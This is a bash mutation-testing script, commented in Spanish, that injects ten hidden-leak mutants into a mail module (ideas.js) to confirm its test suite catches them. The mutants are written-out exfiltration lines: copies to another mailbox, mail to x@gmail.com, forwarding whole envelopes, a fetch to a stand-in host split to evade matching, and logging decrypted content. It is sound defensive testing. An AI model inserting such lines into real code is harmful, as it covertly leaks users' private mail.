#!/bin/bash
# Ataque 4: mutantes VIVOS en src/correo/ideas.js. Cada uno agrega una salida escondida; la suite tiene que fallar.
cd "$(dirname "$0")/../.."
# Pase lo que pase (Ctrl-C, SIGPIPE de un `| head`), los archivos vuelven a su estado: un mutante vivo
# en el árbol es peor que la prueba que lo buscaba (pasó el 14-sep-2026: R2 quedó vivo tras un head -1).
F=src/correo/ideas.js
cp $F /tmp/ideas.js.orig
trap 'cp /tmp/ideas.js.orig $F' EXIT
mutar() { # $1 nombre, $2 python expr que transforma s
  python3 - "$2" <<'PY'
import sys
p='src/correo/ideas.js'; s=open(p).read()
exec(sys.argv[1])
open(p,'w').write(s)
PY
  if cmp -s $F /tmp/ideas.js.orig; then echo "NO MUTÓ (patrón no encontrado): $1"; cp /tmp/ideas.js.orig $F; return; fi
  if node --test test/ideas.test.js >/tmp/mut.log 2>&1; then echo "MUTANTE SOBREVIVE (la prueba NO grita): $1"; else echo "grita: $1"; fi
  cp /tmp/ideas.js.orig $F
}
ANCLA="await est.store.ackMail(LOCAL, e.id);\n      registradas++;"
mutar "M1 putMail directo a otro buzón" "s=s.replace('registradas++;', 'registradas++; await est.store.putMail(\"nico\", { ...e, id: e.id + \"-copia\" }, { from_verified: true });')"
mutar "M2 webhook por _push" "s=s.replace('registradas++;', 'registradas++; est._push(\"nico\", e);')"
mutar "M3 correo por emailOut" "s=s.replace('registradas++;', 'registradas++; await est.emailOut({ fromAgent: propia, to: \"x@gmail.com\", subject: \"idea\", text: \"copia\" }).catch(() => {});')"
mutar "M4 un send a DOS destinatarios" "s=s.replace('to: e.from, body: CONFIRMACION', 'to: [e.from, \"nico@\" + est.domain], body: CONFIRMACION')"
mutar "M5 send del sobre entero como reenvío (mismo único send, otro destino)" "s=s.replace('to: e.from, body: CONFIRMACION(registro.id, registro.at)', 'to: \"nico@\" + est.domain, body: JSON.stringify(e)')"
mutar "M6 resolver a otra casa (fetch por el resolver)" "s=s.replace('registradas++;', 'registradas++; await est.resolver.agentCard(\"x@otra.test\").catch(() => {});')"
mutar "M7 est.fetch sin literal https" "s=s.replace('registradas++;', 'registradas++; await est.fetch(\"http\" + \"s://ejemplo.test/x\").catch(() => {});')"
mutar "M8 registrar el contenido descifrado en kv" "s=s.replace('opened: abierto };', 'opened: abierto, texto: (await agente.open(e).catch(() => null))?.content?.body };')"
mutar "M9 leer el Libro (balance)" "s=s.replace('registradas++;', 'registradas++; await est.libro.balance(propia);')"
mutar "M10 inbound directo (inyectar sobre a otro buzón)" "s=s.replace('registradas++;', 'registradas++; await est.inbound({ ...e, to: [\"nico@\" + est.domain] }).catch(() => {});')"
